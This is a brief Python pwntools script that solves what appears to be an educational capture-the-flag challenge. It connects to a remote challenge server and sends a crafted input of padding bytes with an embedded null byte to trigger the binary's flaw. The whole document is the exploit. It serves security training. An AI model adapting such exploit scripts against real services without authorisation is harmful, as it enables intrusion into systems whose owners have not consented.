from pwn import *

offset = 10
host = "chals.secedu.site"
port = 5000

elf = ELF("./chal")
# p = elf.process()
p = remote(host, port)

payload = b'B' * offset + b'\0' + b'A' + b'1'

log.info(p.recv())
p.sendline(payload)
log.info(p.recv())
p.sendline(b'')
log.success(p.recv())
